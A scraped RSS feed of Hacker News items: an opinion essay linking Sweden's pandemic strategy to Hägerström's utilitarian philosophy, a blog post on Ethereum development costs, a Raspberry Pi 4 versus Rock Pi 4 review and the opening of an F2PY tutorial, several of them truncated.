<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="6d6ca2c" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
			<p>The year is 1911. The setting, the Swedish university of Uppsala’s <em>aula magna, </em>bursting with listeners. The occasion is the installation of the Swedish philosopher Axel Hägerström as chair professor of practical philosophy.</p>
<p>As part of the ceremony Hägerström was to hold a public lecture. Not long into the address, Hägerström’s explosive philosophy managed to spark a riot in the lecture-hall: vegetables were hurled, doors slammed. At the end of the lecture, the archbishop of the Swedish Lutheran church, the Reverend Nathan Söderblom, stood up and asked how anyone who harbored such views could ever behave decently towards his wife and kids.</p>
<p>Whether or not this is an accurate portrayal of the event, this is the form the story was handed down to me by one of my professors at Uppsala University, a proud inheritor of the tradition of Hägerström. The anecdote was delivered with an air of disbelief over the naiveté of the archbishop’s question. How could anyone believe that such abstract and abstruse doctrines on the semantics of ethical sentences could have any concrete repercussions on practical issues like how one treats one’s family?</p>
<p>More than a century after Hägerström’s lecture, Sweden’s response in the global COVID-19 pandemic has cast long shadows, drawing attention from all over the globe. Unlike the vast majority of other countries, Sweden has taken scant measures to hinder the spread of the virus. No lockdown. No closure of schools or public means of transport. No obligatory face masks. The infection was left to spread as quickly and widely as possible, in an attempt to achieve “herd immunity” among the population. As a result of this, Sweden is among the countries with the highest death toll per capita, more than twenty times as much as other comparable Nordic countries, all of which have taken considerably stronger measures.</p>
<p>At bottom, the Swedish strategy rests on a set of ethical positions that the government has chosen to adopt. These positions, in turn, look surprisingly like those staked out in Hägerström’s 1911 lecture. There is a clear line of influence running from the marmoreal halls of the university’s <em>aula </em>to the halls of power today. Although the materialism of our present society may suggest otherwise, ideas leave deep marks – a good example being precisely the materialism of our present society.</p>
<p>The title of the Hägerström’s historic 1911 lecture was “On the Truth of Ethical Utterances.” In it, the philosopher laid out something of a manifesto for the ethical position known as ethical non-cognitivism. He argued that any sentence expressing an ethical stance – any statement about what is good and what is bad – is necessarily nonsense. Asking whether an action is right or wrong, Hägerström assures us, is analogous to wondering about the amount of “justice” contained in a bar of gold, or how heavy a color happens to be. Ethical opinions are simply the reflection of personal emotions, and as such cannot be subject to either truth or falsehood.</p>
<p><em>Pace</em> my professor, Hägerström did, in fact, see his non-cognitivism as the cornerstone for a radical programme for political change. In “On the Truth of Ethical Utterances,” he describes his vision of a new ethics spawning to life from the ashes of the old one. This phoenix-like morality, having shed the fetters of metaphysics and superstition, would thereafter follow a single ethical lodestar: <em>functionality</em>. The effect of this approach was a practical utilitarianism: the goal of ethics in practice became to maximize the amount of utility for the greatest possible number. The scientific veneer of utilitarian ethics made it the perfect candidate for Hägerström’s post-metaphysical ethics of functionality. While it is nonsense to measure the “justice” of a gold ingot, it certainly makes a lot of sense to ask how much “utility” that gold can buy. Functionality is measurable; measurability is functional. Hägerström thus embodies the widely celebrated Swedish value of functionality. Indeed, it is no hyperbole to say that functionality is the country’s most cherished value. It also happens, slightly more worryingly, to be the only one.</p>
<p>The shockwaves of influence of Hägerström’s double-barreled approach of theoretical non-cognitivism coupled with a practical utilitarianism are too insidious to fully map. The ideas wormed their way into the official ideology of the Social-Democratic Party, which held an iron grip on Swedish politics for the better part of a century. Several of Hägerström’s students clambered up the party hierarchy and served long terms as ministers. The minister and economist Gunnar Myrdal, a disciple of Hägerström, described his master’s influence as ripples in water, expanding indefinitely until nobody was left unaffected. Hägerström’s students also became the architects behind Sweden’s “social engineering” programmes in the 1950s – government initiatives to streamline the population in order to increase its utility and functionality. “Social engineering” – or the project of shaping the “human-material”, as it was called – was (naturally) linked to comprehensive eugenic programmes. The Swedish pandemic strategy of achieving “herd immunity” (weeding out weaker individuals for the sake of “herd’s” utility) has a venerable history.</p>
<p>With this historical background in mind the reasoning behind the Swedish strategy becomes clearer, and, if anything, more appalling. At bottom, it is founded on a utilitarian calculus. Swedish authorities made no secret of the evaluation that needed to take place: one had to choose between the economy and the elderly, the unfettered functioning of society versus the health of its citizens – either justice or gold. The outcome of the calculations was clear: Sweden would opt for the alternative that maximizes utility across the board, even if in the process – as the euphemism goes – some eggs would need to be broken.</p>
<p>No wonder, then, that utilitarian philosophers came out in force in defense of the Swedish strategy. As the Swedish ethicist Olle Torpman bluntly wrote back in April: “Can we really put a price tag on people’s lives? Can we really compare somebody’s death with another person’s happiness or lack thereof? The answer is: yes.”<sup><a href="#footnote_0_2556" id="identifier_0_2556" title="Olle Torpman, “Moralfilosofin som ger Sverige rätt” (“The Ethical Philosophy that Supports the Swedish Strategy”), Kvartal.">1</a></sup></p>
<p>Likewise, the internationally acclaimed utilitarian ethicist Torbjörn Tännsjö publicly defended the “Swedish strategy” precisely on the grounds of its palpably utilitarian texture. As he said in an interview: “It sounds as if the government is prepared to sacrifice a number of individuals – at any rate in the short term – to save as many human lives as possible on the whole, partly by indirectly saving the economy.”<sup><a href="#footnote_1_2556" id="identifier_1_2556" title="Åke Gavfelin and Lapo Lappin, “Interview with Torbjörn Tännsjö”, Metafysiskalaboratoriet.">2</a></sup> There is a more than a hint of triumphalism in Tännsjö’s defense: he cannot help but note that ethical boards across the country are spangled with his former doctoral students, who, he claims, do their best to dress up their utilitarianism enough to get away with it, while following it religiously in practice.<sup><a href="#footnote_2_2556" id="identifier_2_2556" title="Ibid.">3</a></sup></p>
<p>With all due respect to Tännsjö, if the utilitarianism is meant to be covert, his students are the least subtle players of hide-and-seek in the history of philosophy. Only a cursory glance at the ethical reports drawn up under the pandemic betrays an explicit utilitarianism. In a report on the Swedish approach, the Ethical Board of State laid out the ethical foundations to defend the strategy. This document follows through a rigorous utilitarian calculation, tallying up the greatest possible well-being for the greatest possible number. As the board writes in one official document: “To address the question [of which strategy should be chosen] we need to focus on the possible and relevant <em>consequences</em>.”<sup><a href="#footnote_3_2556" id="identifier_3_2556" title="The Swedish National Council on Medical Ethics, Etiska vägval i pandemin, 44.">4</a></sup> From the very outset, the question is formulated within a consequentialist ethical framework. The board goes on to list which such “relevant” consequences to be weighed against each other: they begin by noticing that one of these is the loss of lives, but are quick to dilute it with a much longer list, including social and psychological factors, proximate and remote economic factors, freedom, feelings of alienation. The cost of the state intervening to save lives, they suggest in one passage, must be weighed against the cost of the “support” for the government ebbing among the population.<sup><a href="#footnote_4_2556" id="identifier_4_2556" title="SMER, Etiska vägval i pandemin, 43-44.">5</a></sup></p>
<p>This calculation is, after all, perfectly in line with the pronouncements of the Ministry of Public Health; the strategy was repeatedly justified on the grounds that it allowed things to run smoothly: it was “sustainable” in the long run, as “effective” as possible.</p>
<p>A century after the Lutheran archbishop’s question to Hägerström, we are perhaps ready to suggest an answer. Whether or not we think a non-cognitivist and utilitarian father can be a decent father, it is certainly the case that a non-cognitivist and utilitarian state cannot be a decent state. We have yet to see any form of genuine remorse over the shedding of lives from those in positions of power. We may have a long wait ahead. After all, there can be no remorse for something one believes is entirely justified, even mandated, by an objective standard.</p>
<p>Perhaps the bottom line is that the cynicism of the Swedish strategy ought to raise as few eyebrows abroad as it does here in Sweden. In a society where the only value is utility, where vulnerable groups are expendable as long as the pay-off is high enough, where the values of human dignity and the holiness of life are regarded as metaphysical mumbo-jumbo, where gold will always trump justice, really – what else could one expect?<a href="#_ftnref1" name="_ftn1"></a></p>

<p><em>[Photo Attribution: Joakim Emanuelson, CC BY-SA 4.0 &lt;https://creativecommons.org/licenses/by-sa/4.0&gt;, via Wikimedia Commons]</em></p>
<ol><li id="footnote_0_2556">Olle Torpman, “Moralfilosofin som ger Sverige rätt” (“The Ethical Philosophy that Supports the Swedish Strategy”), <em>Kvartal</em>.<span>[<a href="#identifier_0_2556">↩</a>]</span></li><li id="footnote_1_2556">Åke Gavfelin and Lapo Lappin, “Interview with Torbjörn Tännsjö”, Metafysiskalaboratoriet.<span>[<a href="#identifier_1_2556">↩</a>]</span></li><li id="footnote_2_2556">Ibid.<span>[<a href="#identifier_2_2556">↩</a>]</span></li><li id="footnote_3_2556">The Swedish National Council on Medical Ethics, <em>Etiska vägval i pandemin</em>, 44.<span>[<a href="#identifier_3_2556">↩</a>]</span></li><li id="footnote_4_2556">SMER, <em>Etiska…</em></li></ol></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://macrinamagazine.com/issue-6-general/guest/2021/02/20/the-justice-of-gold-the-philosophical-roots-of-swedens-pandemic-strategy/">https://macrinamagazine.com/issue-6-general/guest/2021/02/20/the-justice-of-gold-the-philosophical-roots-of-swedens-pandemic-strategy/</a></em></p>]]>
            </description>
            <link>https://macrinamagazine.com/issue-6-general/guest/2021/02/20/the-justice-of-gold-the-philosophical-roots-of-swedens-pandemic-strategy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222756</guid>
            <pubDate>Mon, 22 Feb 2021 10:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ethereum Isn't Fun Anymore]]>
            </title>
            <description>
<![CDATA[
Score 285 | Comments 592 (<a href="https://news.ycombinator.com/item?id=26222709">thread link</a>) | @timdaub
<br/>
February 22, 2021 | https://timdaub.github.io/2021/02/22/ethereum-isnt-fun-anymore/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2021/02/22/ethereum-isnt-fun-anymore/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><strong>Ethereum isn't fun anymore. There I said it.</strong> And although, the last time I developed an app using it has been more than a year ago, I stand by my word. <strong>Developing dapps on Ethereum has become annoying</strong>. Here's why:</p>
<p><img src="https://timdaub.github.io/assets/images/pedro.gif"></p>
<h2 id="i-used-ethereum-before-it-was-cool.">I used Ethereum before it was cool.</h2>
<p>I know; it's such a hipster statement. But it's true. Ethereum has stopped being edgy. It has transitioned out of its niche to build a world computer. Its community has become huge, and I stopped knowing most faces. Where there was a feeling of revolution and new beginnings, now there are people in suits talking corporate. Within just a few years, it went from <a target="_blank" rel="noopener" href="https://github.com/DaddyDeFi/DaiDaddy">DAI daddys</a> and only <a target="_blank" rel="noopener" href="https://www.molochdao.com/">half-ironic satanist cults</a> to lending, insurance, and trade protocols.</p>
<p>"What's Ethereum's killer app?" we asked ourselves not long ago. Now we know. It's the world's best publicly-accessible settlement platform for financial transactions. In a way, that's exciting. The markets think so too. But for anyone else that worked with Ethereum but outside of financial applications, it's somewhat of a letdown.</p>
<p><img src="https://timdaub.github.io/assets/images/homer.gif"></p>
<h2 id="how-do-you-do-fellow-ethereans">How do you do, fellow Ethereans?</h2>
<p>I think it must have been around the time of the last big crypto bubble when Monero enthusiasts called for "Making Monero cheap again."</p>
<p>Monero, being the anonymous digital currency that had indeed just legit use cases apart from the occasional rumors that entangled it in drug trafficking, had suddenly become too expensive for everyday use. Realizing the glaring threat of becoming too valuable, its core developers went on to fix the problem by campaigning at CoinDesk's yearly industry gathering Consensus.</p>
<p>They announced the "Monero Enterprise Alliance." An inside joke, supposed to piss off other projects that had started to take themselves too seriously. Being slightly confused that day myself, I now can't recall if the effort had ever been successful. But in any case, I can't recommend buying Monero. It's useless.</p>
<h2 id="gas-prices-are-too-damn-high">Gas prices are too damn high!</h2>
<p><img src="https://timdaub.github.io/assets/images/deepfried_high_rents.jpg"></p>
<p>There was a phase in my short career as an Ethereum developer where I looked at Etherscan's "<a target="_blank" rel="noopener" href="https://etherscan.io/contractsVerified">Verified Contracts</a>" page all day long to find vulnerabilities in newly uploaded contracts. "My name's Tim and I'm an etherholic!"</p>
<p>It was addictive. I ended up calling a few of those contracts, failing to cause any havoc, sadly. But it was so much fun! Back when transaction fees were still affordable on Ethereum, building projects was great. We started up Ganache and our favorite text editor (vim). The only choice we had was Solidity. And off we went.</p>
<p>Now, building Ethereum applications has become painful. <a href="https://timdaub.github.io/2020/09/08/web3/">web3 is a stupid idea</a>. Layer 2 isn't ready. Neither is Eth 2.0. And there are still <a href="https://timdaub.github.io/2019/02/28/poa/">many reasons to NOT ship to a Proof of Authority network</a>. Finally, gas prices are too damn high!</p>
<p>How do we move on from here?</p>
<h2 id="i-need-a-hero.">I need a hero.</h2>
<p><strong>I need a hero, and by that, I mean that I need a usable methodology for building scaleable decentralized apps.</strong> Yes, you've heard that right. We don't need more "Ethereum killers" that can do 10x more tx/s than Ethereum. Those are useless.</p>
<p>Instead, we need an approach for the average Joe developer to create their idea within the Ethereum ecosystem without the need for hardcore unproven technologies. I know, you Vitalik will say: "Oh, it's not a problem, we can has '<a target="_blank" rel="noopener" href="https://vitalik.ca/general/2020/03/21/garbled.html">Garbled Circuits</a>' and zkrollups." But I'm telling you that no sane Joe will touch that shit without a serious cryptographic specialist by their side.</p>
<p>We want what we stayed for initially: Good ol smart contracts. But right now, they're too damn expensive to innovate.</p>

  </div></div>]]>
            </description>
            <link>https://timdaub.github.io/2021/02/22/ethereum-isnt-fun-anymore/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222709</guid>
            <pubDate>Mon, 22 Feb 2021 10:05:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I sold my Raspberry Pi 4 for a Rock Pi 4]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26222704">thread link</a>) | @voxadam
<br/>
February 22, 2021 | https://ikarus.sg/why-i-sold-my-raspberry-pi-4-for-a-rock-pi-4/ | <a href="https://web.archive.org/web/*/https://ikarus.sg/why-i-sold-my-raspberry-pi-4-for-a-rock-pi-4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://ikarus.sg/content/images/size/w300/2021/02/rpi-rockpi.png 300w,
                            https://ikarus.sg/content/images/size/w600/2021/02/rpi-rockpi.png 600w,
                            https://ikarus.sg/content/images/size/w1000/2021/02/rpi-rockpi.png 1000w,
                            https://ikarus.sg/content/images/size/w2000/2021/02/rpi-rockpi.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://ikarus.sg/content/images/size/w2000/2021/02/rpi-rockpi.png" alt="Why I sold my Raspberry Pi 4 for a Rock Pi 4">
            </figure>

            <section>
                <div>
                    <p>I sold my Raspberry Pi 4B 4GB recently and replaced it with a Rock Pi 4A. I had owned it for about 6 months before finally letting it go at a significant loss and honestly, that decision was not as hard as I thought. On this piece, I document my anticipations, disappointments, and epiphanies over the course of 6 months owning the Raspberry Pi 4B.</p><blockquote>Disclaimer: I'm not affiliated with nor sponsored by Radxa/Allnet, the manufacturers of Rock Pi. I'm writing this piece purely to share my experiences with both the Raspberry Pi 4B 4GB and the Rock Pi 4A 4GB.</blockquote><h2 id="i-need-more-memory-">I. Need. More. Memory.</h2><p>It was February 2020, I was running my self-hosted apps all on the <a href="https://ikarus.sg/how-i-built-kraken/">Kraken</a> cluster then. At that point in time I wanted to run a metric-monitoring stack (<em>Prometheus</em> + <em>Grafana</em>) for the cluster but after reviewing the memory requirements, I quickly realized that not even all the memory on a single Raspberry Pi 3B node was enough (although I'm cognizant that 1GB isn't much in the grander scheme of things). </p><p>Browsing around, the most obvious choice was the next model in the Raspberry Pi line that was just released a few weeks earlier then, the Raspberry Pi 4B 4GB.</p><h2 id="the-shiny-raspberry-pi-4b">The Shiny Raspberry Pi 4B</h2><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Aspect</th>
<th>Raspberry Pi 3B</th>
<th>Raspberry Pi 4B 4GB</th>
</tr>
</thead>
<tbody>
<tr>
<td>CPU</td>
<td>Broadcom BCM2837 (Quad core)</td>
<td>Broadcom BCM2711 (Quad core)</td>
</tr>
<tr>
<td>Cores</td>
<td>4x Cortex-A53 1.2GHz</td>
<td>4x Cortex-A72 @ 1.5GHz</td>
</tr>
<tr>
<td>Memory</td>
<td>1GB LPDDR2</td>
<td>4GB LPDDR4-3200</td>
</tr>
<tr>
<td>Ethernet</td>
<td>100Mbps</td>
<td>1000Mbps</td>
</tr>
<tr>
<td>Storage</td>
<td>Micro-SD Card</td>
<td>Micro-SD Card</td>
</tr>
<tr>
<td>USB</td>
<td>4x USB2.0</td>
<td>- 2x USB 3.0<br>- 2x USB 2.0</td>
</tr>
<tr>
<td>Power</td>
<td>5V 2A Micro-USB</td>
<td>5V via USB-C connector (&gt;=3A)</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>There were quite a few aspects about the Raspberry Pi 4B 4GB that got me excited: 4GB Memory, Gigabit Ethernet, yada yada. But what I anticipated the most was the long-overdue elimination of the <u>painful</u> <a href="https://ikarus.sg/how-i-built-kraken/#some-caveats">USB 2.0 bus bottleneck</a> that plagued all Raspberry Pi models from Zero to 3B+. </p><p>In the Raspberry Pi 4, the ethernet is built directly into the SoC and no longer shares a bottlenecked bus with USB devices. This means we can unleash the full potential of the gigabit ethernet port without worrying about performance degradation of the micro-SD card or external drives, and vice-versa. </p><p>On top of all those changes, the Raspberry Pi 4B doubled the micro-SD card slot bandwidth from 20MB/s to 40MB/s. While this is still not cutting-edge performance, it's still a significant and welcome improvement, especially for tasks that have high demands for sequential I/O.</p><blockquote>Delay no more!</blockquote><p>With those specs, I made a trip down to Amicus @ Sim Lim Tower to snag one from the shelves.</p><h2 id="what-belies-the-shine">What Belies the Shine</h2><p>At the point of purchase and over 6 months of usage, I've uncovered many issues that really made me second-guess my purchase. </p><p>These are the pain points I've identified, each of which I will cover in detail in dedicated sections:</p><ol><li>Power concerns</li><li>Heat dissipation issues</li><li>No official cooling solutions</li><li>32-bit Operating System</li><li>Operating Systems Available and Compatibility with k8s</li><li>Storage performance</li><li>Storage longevity</li></ol><h3 id="power-concerns">Power Concerns</h3><p>Interestingly, a red flag had already surfaced prior to purchase, but I conveniently ignored it in favor of my excitement; the power supply. There were many complaints online that <a href="https://hackaday.com/2019/07/16/exploring-the-raspberry-pi-4-usb-c-issue-in-depth/">electronically-marked USB-C cables did not work</a> due to a flaw with the Raspberry Pi 4 hardware design that caused it to detect the charging cable as an audio accessory. </p><figure><img src="https://ikarus.sg/content/images/2021/02/image.png" alt=""><figcaption>Electronic market in USB-C cables (<a href="https://www.elinfor.com/market/how-to-identify-the-usb-c-cables-with-or-without-e-maker-m-27">Source</a>)</figcaption></figure><p>For context, <em>standards-compliant</em> USB-C cables that support <em>more than 3.0A </em>(Thanks <a href="https://www.reddit.com/user/ferrybig/">ferrybig</a> from <a href="https://www.reddit.com/r/selfhosted/comments/loykcd/why_i_sold_my_raspberry_pi_4_for_a_rock_pi_4_at/">/r/selfhosted</a> for correcting me with the <a href="https://www.usb.org/sites/default/files/USB%20Type-C%20Spec%20R2.0%20-%20August%202019.pdf#%5B%7B%22num%22%3A82%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C87%2C421%2C0%5D">USB C spec</a>) current have a tiny microchip embedded within it that enables smart features such as voltage and USB protocol negotiation which provides information on supported voltages and data transfer rates to the other end. The microchip also doubles as protection for your device from over-voltage and other electrical risks. We have seen from the sacrifices of Benson Leung, full-time Google engineer and part-time USB-C vigilante, going around on Amazon testing USB-C cables and <a href="https://www.slashgear.com/beware-usb-c-cables-that-could-seriously-fry-your-device-03425324/">frying his Chromebook Pixel in the process</a>, what kind of damage non-compliant cables can potentially do to your devices.</p><figure><a href="https://www.engadget.com/2016-02-03-benson-leung-chromebook-pixel-usb-type-c-test.html"><div><p>Google engineer fries Pixel testing USB Type-C cable | Engadget</p><p>You might not remember Benson Leung, the Google engineer that tasked himself with examining USB Type-C cables. He’s been diligently doing so for months, but he’s calling his tests to a halt after one went horribly wrong. Leung bought a USB 3.1 Type-C SuperSpeed cable (it’s since been removed) from S…</p><p><img src="https://s.yimg.com/kw/assets/favicon-160x160.png"></p></div><p><img src="https://s.yimg.com/uu/api/res/1.2/.1w_EgFevrhtuAoC8AytLw--~B/aD05NDI7dz0xNDAwO2FwcGlkPXl0YWNoeW9u/https://s.yimg.com/uu/api/res/1.2/0I.gp7wz7N1ofOUfCVBLwQ--~B/aD05NDI7dz0xNDAwO2FwcGlkPXl0YWNoeW9u/https://o.aolcdn.com/hss/storage/midas/9bdc1aa766dc7bc1bc964f8a9f843dc8/203351772/chromebookpixelport.jpg.cf.jpg"></p></a></figure><p>I find it rather ridiculous that in order to power the Raspberry Pi 4B, one had to source for cables that did not have the embedded microchip and hence potentially unsafe.</p><p>Other than that issue, I also had concerns that my existing power supply, the <em>Anker PowerPort 10</em>, would not be sufficient for the Raspberry Pi 4, given that it only supports up to <em>5V 2.0A</em>. The official page states that the Raspberry Pi 4B needs <em>at least 5V 3.0A</em> to work, which means I'd need to get something like a <em>Qualcomm QuickCharge 3.0</em> brick specifically for it. </p><p>In the end, out of an abundance of caution I bought the <em>extortionately priced</em> official Raspberry Pi 4B power supply at <strong>S$18 (US$13.40)</strong>. To put things into perspective, that power brick costed<strong> 20.93% of a Raspberry Pi 4B 4GB</strong> priced at <strong>S$84.99 (US$64.03)</strong>!</p><h3 id="heat-dissipation-issues">Heat Dissipation Issues</h3><p>Heat was a real problem with the Raspberry Pi 4B. With an ambient temperature in Singapore at around <em>31°C</em>, the Raspberry Pi &nbsp;4B idles at around <strong>52°C</strong>, and quickly hits a toasty <strong>80°C </strong>on medium load, after which it thermal-throttles itself to oblivion. </p><figure><pre><code>$ sudo vcgencmd measure_temp
temp=81.2'C</code></pre><figcaption>Command to measure temperature on Raspberry Pi OS</figcaption></figure><p>I realized this when I tried running hardware-accelerated transcode of videos from HEVC to H.264 in <a href="https://jellyfin.org/">Jellyfin</a>. The first few seconds would render perfect in real-time, beyond that the CPU/GPU throttles and the video renders at <strong>0.25x</strong> speed. At this speed, I'd have to wait 4 seconds just to watch 1 second. </p><p>To demonstrate what <em>0.25x</em> means, here's an example: to render a full <em>40-minute</em> episode, I'd have to wait for a whole <strong>2h 40m</strong> for it to render. This pretty much <em>renders</em> the video unwatchable on the Raspberry Pi 4 (pun intended). Shockingly, this performance actually comparable to that of software transcode on the Raspberry Pi 3B without any cooling.</p><p>Besides video transcoding, I've tried applications that do not generate as much load, such as running <em>PostgreSQL</em> and <em>MariaDB</em>. I thought running databases on the Raspberry Pi 4 was the obvious choice since it has double the I/O bandwidth of a Raspberry Pi 3. However, even that pushed the Raspberry Pi 4 to its thermal throttling limits, and though I did not run precise database performance benchmarks, I did measure an average of <em>1.2s longer load times</em> on my Nextcloud home page, over 10 refreshes with browser caching disabled, during which the CPU utilization on the Raspberry Pi 4 would peak.</p><p>If this trend holds true, it means I've spent more money to purchase a device with poorer performance than my existing Raspberry Pi 3Bs (at least without investment on cooling solutions) 🤦‍♂️.</p><h3 id="no-official-cooling-solutions">No Official Cooling Solutions</h3><p>I searched far and wide for a solution to the heat problem. I've came across solutions on both ends of the price spectrum.</p><figure><div><div><p><img src="https://ikarus.sg/content/images/2021/02/Raspberry_Pi_4_Heat_Sinks_1_Copper_2_Aluminium_-_BC-01_1200x-1.jpg" width="1200" height="1200" alt=""></p><p><img src="https://ikarus.sg/content/images/2021/02/Raspberry_Pi_4_Heat_Sinks_1_Copper_2_Aluminium_-_BC-88_1200x.jpg" width="1200" height="1200" alt=""></p></div></div><figcaption>Affordable generic heatsinks (<a href="https://www.makersupplies.sg/products/raspberry-pi-4-heat-sinks-1-copper-2-aluminium">Source</a>)</figcaption></figure><p>The cheapest ones are those generic, colored heatsinks that cost around S$6 (US$4.61) for a set.</p><figure><div><div><p><img src="https://ikarus.sg/content/images/2021/02/ar_one_pi4_01.jpg" width="1000" height="1000" alt=""></p><p><img src="https://ikarus.sg/content/images/2021/02/ar_one_pi4_03.jpg" width="1000" height="1000" alt=""></p></div></div><figcaption>ArgonOne heatsink-case for the Raspberry Pi 4 (<a href="https://www.argon40.com/catalog/product/view/id/52/s/argon-one-raspberry-pi-4-case/">Source</a>)</figcaption></figure><p>Unsurprisingly, the pricier cases are from reputable Raspberry Pi accessory manufacturers. The most pricey one was the <a href="https://www.argon40.com/catalog/product/view/id/52/s/argon-one-raspberry-pi-4-case/"><em>ArgonOne</em> from ArgonForty</a> at S$32.50 (US$25), an intricately designed heatsink-case combo with a software-controlled PWM-fan for active-cooling. </p><p>Personally, I'm very sensitive to background noise and am easily distracted by it so I was looking for passive-cooling solutions. However, upon doing a cursory search, there were quite a number of users out there facing issues with passive cooling. </p><figure><a href="https://downey.io/blog/raspberry-pi-4-heatsinks-and-fans/#important-update"><div><p>The Great Raspberry Pi Cooling Bake-Off: Comparing Passive Heatsinks and Active Cooling for the Raspberry Pi 4|downey.io</p><p>Why is my Raspberry Pi 4 running so hot? You may know you need something to cool it down, but what? In this post we compare the performance of various Raspberry Pi coolers. All the way from the humble heatsink to a massive cooling tower complete with RGB fans.</p><p><span>Tim Downey</span></p></div><p><img src="https://images.downey.io/raspi/raspi-cooler-tower.jpg"></p></a></figure><p>Tim Downey has written a <a href="https://downey.io/blog/raspberry-pi-4-heatsinks-and-fans/#important-update">fantastic piece</a> on different cooling solutions he tested for the Raspberry Pi 4. In particular, in one of his tests, he had the <em>ArgonNEO</em> which was essentially an <em>ArgonOne</em> without a fan. On running CPU-intensive tasks, his case reached temperatures above <strong>80°C</strong>! The <em>ArgonNEO</em> is not a low-quality case by any standards, it's a pretty chunky aluminum case that can hold and dissipate quite a lot of heat! These temperatures on the surfaces of the case are not just potentially damaging for the furniture but also dangerous for kids and pets. It seems like cooling has become a matter of safety as well, and not just performance.</p><figure><div><div><p><img src="https://ikarus.sg/content/images/2021/02/dual-fan-heatsink-raspberry-pi4-A-600x600-1.jpg" width="600" height="600" alt=""></p><p><img src="https://ikarus.sg/content/images/2021/02/dual-fan-heatsink-raspberry-pi4-B-600x600.jpg" width="600" height="600" alt=""></p></div></div><figcaption>Generic dual-fan heatsink from Shopee (Source no longer exists, others available)</figcaption></figure><p>I went for an active cooling solution in the end after having doubts on the adequacy of passive cooling and bought a generic cheap dual-fan heatsink off <a href="https://shopee.sg/Cooler-Internal-Dual-Fan-With-Heat-Sink-Easy-Install-Ultimate-Durable-Accessories-Lightweight-For-Raspberry-Pi-3B-4B-i.38963929.3204455009">Shopee</a> at <strong>S$6.09 (US$4.68)</strong>.</p><p>At that point, I was rather disappointed that the Raspberry Pi 4 is <em>practically unusable out-of-the-box</em> for anything more than lightweight applications and simple shell scripts even though it has so much performance headroom. With that kind of performance impact, I had hoped that the Raspberry Pi foundation at least provided some semblance of an official add-on cooling solution instead of forcing the user to go out of his/her way to get it to work as it was designed to.</p><h3 id="32-bit-operating-system">32-bit Operating System</h3><p>The official/recommended operating system for the Raspberry Pi 4B is <em>Raspbian</em> (now known as <em>Raspberry Pi OS</em>). It's a <em>32-bit</em> Debian-based operating system, and the problem lies in this number of bits.</p><p>The Raspberry Pi 3B …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ikarus.sg/why-i-sold-my-raspberry-pi-4-for-a-rock-pi-4/">https://ikarus.sg/why-i-sold-my-raspberry-pi-4-for-a-rock-pi-4/</a></em></p>]]>
            </description>
            <link>https://ikarus.sg/why-i-sold-my-raspberry-pi-4-for-a-rock-pi-4/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222704</guid>
            <pubDate>Mon, 22 Feb 2021 10:04:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[F2PY: Calling Fortran Routines from Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26222664">thread link</a>) | @optimalsolver
<br/>
February 22, 2021 | https://www.numfys.net/howto/F2PY/ | <a href="https://web.archive.org/web/*/https://www.numfys.net/howto/F2PY/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		
        <p>Last edited: September 5th, 2019</p>
<hr>
<p>This tutorial gives a quick introduction to the F2PY package and how to use it as a command line tool. F2PY is a part of NumPy (<code>numpy.f2py</code>) and can also be used as a Python module. Check out <a href="https://docs.scipy.org/doc/numpy/f2py/">F2PY's user guide</a> for a more complete reference and installation procedures. 
From the documentation:</p>
<p><em>The purpose of the F2PY –Fortran to Python interface generator– is to provide a connection between Python and Fortran languages. F2PY is a part of <a href="https://numpy.org/">NumPy</a> (<code>numpy.f2py</code>) and also available as a standalone command line tool f2py when numpy is installed that facilitates creating/building Python C/API extension modules that make it possible</em></p>
<ul>
<li>
<p><em>to call Fortran 77/90/95 external subroutines and Fortran 90/95 module subroutines as well as C functions;</em></p>
</li>
<li>
<p><em>to access Fortran 77 COMMON blocks and Fortran 90/95 module data, including allocatable arrays.</em></p>
</li>
</ul>
<h2 id="how-does-f2py-work">How does F2PY work?</h2>
<p>F2PY works by creating an extension module that can be imported in Python using the <code>import</code> keyword. The module contains automatically generated wrapper functions that can be called from Python, acting as an interface between Python and the compiled Fortran routines.
First, F2PY reads the Fortran source file and creates a so-called signature file that contains all the necessary information about the Fortran routines needed to make the wrapper functions.
The signature file is then read and the source code of the extension module is generated in C, using the Python C API. In the last step, F2PY compiles all the source code and builds the extension module containing the wrappers and the compiled Fortran routines.</p>
<hr>
<h2 id="why-should-you-use-f2py">Why should you use F2PY?</h2>
<p>The choice of programming language can be challenging at times, especially when it comes to finding a balance between computational efficiency and implementation time and effort. While scripting languages like MATLAB and Python may provide intuitive code which is fast to implement, compiled languages like C/C++ and Fortran yield superior computational speed. By wrapping a compiled code for Python, we can get the best of both worlds!  Our notebook <a href="https://nbviewer.jupyter.org/urls/www.numfys.net/media/notebooks/fortran_to_python.ipynb">Calling Fortran(95) routines from a Python Script</a> shows an example of the usage and the gain in computational time.</p>
<h2 id="when-should-you-use-f2py">When should you use F2PY?</h2>
<p>This is perhaps the ultimate question, and unfortunately, there is no definite answer. A good rule of
thumb however, is to use F2PY, or compiled languages in general, when performing multiple operations/-
computations within (nested) loops. Possibly, the most typical example would be operations on elements
